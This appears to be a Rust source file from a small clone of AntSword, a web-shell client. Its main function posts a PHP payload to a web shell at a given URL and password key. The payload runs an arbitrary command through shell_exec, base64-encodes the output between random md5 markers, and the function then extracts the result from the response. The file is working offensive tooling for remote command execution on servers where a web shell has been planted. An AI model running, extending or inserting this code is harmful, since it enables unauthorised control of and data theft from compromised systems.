use rand::distributions::Alphanumeric;
use rand::{thread_rng, Rng};
use regex::Regex;
use reqwest::{self, Client};

// pub mod crate::utils;

// use mini_antsword_ts::encode;
// use mini_antsword_ts::request;

// use utils::encode;
// use utils::request;

use crate::utils::encode;
use crate::utils::request;

pub fn gen_random_key() -> String {
    thread_rng()
        .sample_iter(&Alphanumeric)
        .take(30)
        .map(char::from)
        .collect()
}

pub async fn echo_base64_encode_system_command<E: AsRef<str>>(
    url: String,
    key: E,
    command: String,
) -> Result<String, Box<dyn std::error::Error>> {
    // 返回的值是base64编码过的
    // TODO:
    // 1. get_res_text 没用到,
    // 2. 接受的不是 base64 字符串

    let rand_separator = gen_random_key();
    let command = format!(
        "echo md5(\"{rand_separator}\");echo base64_encode(shell_exec(\"{command}\"));echo md5(\"{rand_separator}\");"
    );
    let client = Client::new();

    let post_res_text: String = request::post_with_key(&url, &key, &command, &client).await?;
    let _get_res_text: String = request::get_with_key(&url, &key, &command, &client).await?;

    let rand_separator = encode::md5(rand_separator);

    dbg!(&rand_separator);
    // 正则匹配
    let pattern = format!(
        "{}(.*?){}",
        regex::escape(&rand_separator),
        regex::escape(&rand_separator)
    );

    dbg!(&pattern);
    dbg!(&post_res_text);
    // dbg!(&get_res_text);

    let re = Regex::new(&pattern).unwrap();
    let find_warpped_text = re
        .captures(&post_res_text)
        .and_then(|caps| caps.get(1).map(|m| m.as_str().to_string()));
    match find_warpped_text {
        Some(content) => Ok(content),
        None => Err(Box::new(std::io::Error::new(
            std::io::ErrorKind::Other,
            "Error in matching pattern.",
        ))),
    }
}
